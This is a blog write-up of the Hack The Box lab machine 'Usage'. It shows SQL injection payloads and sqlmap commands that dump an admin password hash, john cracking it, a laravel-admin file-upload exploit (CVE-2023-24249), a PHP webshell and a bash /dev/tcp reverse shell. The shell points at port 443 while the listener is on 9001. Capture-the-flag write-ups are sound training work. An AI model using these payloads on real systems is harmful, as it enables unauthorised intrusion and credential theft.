---
layout: post
title: HacktheBox Usage Writeup
date: 2025-02-20 16:27 +0530
categories: [Hackthebox, Machine]
tags: [hackthebox, SQLi, CVE-2023-24249 ]     # TAG names should always be lowercase
---

# Information

| Title         | Details       |
| -------- |:--------:|
| Name         |Usage |
| Base Points	    | 20     |
| Difficulty| Easy      |
| OS | Linux|
| Release Date| 14 Apr 2024 |
| Retire Date | 10 Aug 2024 |

# Brief


# Reconnaissance

Let's will start with basic `nmap` scan

### Nmap

```bash
nmap -sCV -p 22,80 -oA usage.nmap 10.10.11.18 
```

From which I get a bunch of Interesting Information

```bash
# Nmap 7.95 scan initiated Wed Feb 19 23:04:54 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p 22,80 -oA usage.nmap 10.10.11.18
Nmap scan report for 10.10.11.18
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 19 23:05:12 2025 -- 1 IP address (1 host up) scanned in 18.04 seconds

```

We have 2 services OpenSSH and Nginx running on there default ports which are 22(SSH), 80(HTTP)

I also notice that the the web server redirects to `usage.htb`

So let's edit our `Host` file first

```bash
echo 10.10.11.18 usage.htb | sudo tee -a /etc/hosts
```

Now, that I have my host setup, let’s browse and see what the website holds for me...

##### HTTP

Let’s Start with `PORT 80`

On browsing to `usage.htb` and I land on a login page 

![Usage](/assets/img/post/hackthebox/usage/1.png)

I notice that we have the option to log in, register a new account, or navigate to the admin panel. The admin panel also redirects me to the `admin.usage.htb` domain, which I also need to add to our hosts file.

```bash
echo 10.10.11.18 admin.usage.htb | sudo tee -a /etc/hosts
```

Nvaigating to Admin page also presents with us a login page.

![Usage](/assets/img/post/hackthebox/usage/2.png)

I could also register an account for myself on 

> http://usage.htb/registration

![Usage](/assets/img/post/hackthebox/usage/3.png)

We can login after registeration which present us with a blog page where there is nothing much to look

![Usage](/assets/img/post/hackthebox/usage/4.png)

But we have an Reset Password link on login page.

> http://usage.htb/forget-password

When we submit a valid email, such as the one we used to sign up our new account, we get the following response:

![Usage](/assets/img/post/hackthebox/usage/5.png)

whereas in for an invalid email, we get the following response: 

![Usage](/assets/img/post/hackthebox/usage/6.png)

Which indicates that I might be interacting with the database somehow so we cna definetly try fr SQL Injection over here.

Submit the email with following payload

```
test' or 1=1;-- - 
```

![Usage](/assets/img/post/hackthebox/usage/7.png)

In order to confirm our attack vector we input the email with following payload and get invalid email response

```
 test' or 1=2;-- - 
```
![Usage](/assets/img/post/hackthebox/usage/6.png)

# Shell as dash

### SQL Injection (SQLi)

First, we intercept the password reset request with a web proxy like BurpSuite in order to understand the difference between a valid request and response.

Upon further inspection I notice that the result for valid and invalid email is same from server that a bit interesting.

So I will be using sqlmap to exploit it but first let's save the request to a file

```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://usage.htb
Connection: keep-alive
Referer: http://usage.htb/forget-password
Cookie: laravel_session=eyJpdiI6ImcxN0FpdW85WlU5MUYyc1dWTUljQUE9PSIsInZhbHVlIjoiekl0d0tJUjV1RGx6azRMaWxMS200VVpUWFJMNXNEQThzczFQV2w2N0Z1OHNzZ1VMWjQ4ZmtuZ1A1citxTlRKMkVCYnNxdmZNdzU4WlpocCtGUVArMnVyZ01oeUJ6bGU1MkFta0RYMWZtNkdxMUFkek1hN0tPSkxSc2dQaWpuUEUiLCJtYWMiOiIxZWZhMWM0OTY0OTAzNjUxYTM1NTY2ODNiNTg2ZWYzZGE1MWVlNTQyMjM5NWVhN2Q3MWZiZGQ0Mzg0ODUxNzQzIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IkthN0J4L3VoVVl6ZTdraTV0dTlId2c9PSIsInZhbHVlIjoiTVhoVlpCV0h0dy8wbklxUHc5ZmpzSktZZ1hYNE5ocld6VVZKaHE3V2pWa0U3OUJFUnZmWHV1WStsKzJKeFlPTVdWRXNSWWlXdEdvOUlMYWh2ZVRkandacWRoWjlxaDcwWVFIWVVjWjYyNStMTW9wN3FWMm1DNERmODh6U1B5aWEiLCJtYWMiOiIzNDEzZTcwY2FkOWE1Njc3YTRiZjBkMmIzMzEwYWFiODliM2U2ODRkZDkzYTQ5MjdiMGM5NDAyZGIxZTM4NWY3IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

_token=kra4cPtimEEhUIylD2ik25LGIB8QTKurndMIBLe6&email=test
```

Passing the above request vis sqlmap using -r flag

```zsh
┌──(kali㉿kali)-[~/hackthebox/machines/usage]
└─$ sqlmap -r login.req --level 5 --risk 3 --threads 10 -p email --batch --no-cast
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.2#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:51:58 /2025-02-20/

[06:51:58] [INFO] parsing HTTP request from 'login.req'
...[snip]...
sqlmap identified the following injection point(s) with a total of 738 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=kra4cPtimEEhUIylD2ik25LGIB8QTKurndMIBLe6&email=test' AND 7272=(SELECT (CASE WHEN (7272=7272) THEN 7272 ELSE (SELECT 2320 UNION SELECT 2147) END))-- RHum

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=kra4cPtimEEhUIylD2ik25LGIB8QTKurndMIBLe6&email=test' AND 8023=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- YKzO
---
[07:07:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
[07:07:22] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 346 times
...[snip]...
```

To fetch a list of the available databases using the --dbs flag

```zsh
┌──(kali㉿kali)-[~/hackthebox/machines/usage]
└─$ sqlmap -r login.req --level 5 --risk 3 --threads 10 -p email --batch --no-cast --dbs
...[snip]...
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
...[snip]...
```
information_schema and performance_schema are default database related to MySQL, we will enumerate the non-default database `usage_blog`

```zsh
┌──(kali㉿kali)-[~/hackthebox/machines/usage]
└─$ sqlmap -r login.req --level 5 --risk 3 --threads 10 -p email --batch --no-cast -D usage_blog --tables
...[snip]...
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
...[snip]...
```

Dumping the `admin_users` table

```zsh
┌──(kali㉿kali)-[~/hackthebox/machines/usage]
└─$ sqlmap -r login.req --level 5 --risk 3 --threads 10 -p email --batch --no-cast -D usage_blog -T admin_users --dump
...[snip]...
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+--------------------------------------------------------------+----------+
| id | name          | password                                                     | username |
+----+---------------+--------------------------------------------------------------+----------+
| 1  | Administrator | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 
+----+---------------+--------------------------------------------------------------+----------+
...[snip]...
```

Let's crack hash of administrator user using john tool with wordlist rockyou.txt

```zsh
──(kali㉿kali)-[~/hackthebox/machines/usage]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:23 DONE (2025-02-20 07:41) 0.04214g/s 67.50p/s 67.50c/s 67.50C/s alexis1..babyboy1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We can login to admin panel using the following credentials

> admin:whatever1

![Usage](/assets/img/post/hackthebox/usage/8.png)

This is some kind of admin dashboard. It’s showing information about the site, including the packages that are installed and the versions. Given that the top dependency is “laravel-admin”, it seems likely that that’s what is used to build this

Since I know it's main dependency is larvel a quick google search `encore laravel-admin v1.8.18 exploit` gives following result

![Usage](/assets/img/post/hackthebox/usage/9.png)

### CVE-2023-24249 

The vulnerability in larvel with CVE-2023-24249 is an arbitrary file upload issue which leads to code execution on server and explained [here](https://flyd.uk/post/cve-2023-24249/) in detail

Let's create a simple phpinfo() file to validate 

```php
<?php phpinfo(); ?>
```
and save it as `p3n.php.jpg`

On uploading the image it get uploaded successfully

![Usage](/assets/img/post/hackthebox/usage/10.png)

Upon opening it in new tab it show broken image that is because of .jpg extension, let's run it via burp and change extension to .php

![Usage](/assets/img/post/hackthebox/usage/11.png)

![Usage](/assets/img/post/hackthebox/usage/12.png)

Now the page runs commands

![Usage](/assets/img/post/hackthebox/usage/13.png)

Let's upload the PHP webshell 

```php
<?php system($_REQUEST['cmd']); ?>
```
![Usage](/assets/img/post/hackthebox/usage/14.png)

### shell

To get a shell, I’ll start nc listening on port 9001, and then run a bash reverse shell as the command

> http://admin.usage.htb/uploads/images/p3n.jpg.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'

On my nc listner

```bash
┌──(kali㉿kali)-[~/hackthebox/machines/usage]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.18] 52558
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
dash@usage:/var/www/html/project_admin/public/uploads/images$ whoami
whoami
dash
dash@usage:/var/www/html/project_admin/public/uploads/images$ id
id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
dash@usage:/var/www/html/project_admin/public/uploads/images$
```


# Resources

| Topic | Link|
|-------|-----|
| CVE-2023-24249 | [Here](https://flyd.uk/post/cve-2023-24249/)|


With this, we come to the end of the story of how I owned Usage 😃

Thank you for reading !!!

*I would love to hear about any suggestions or queries.*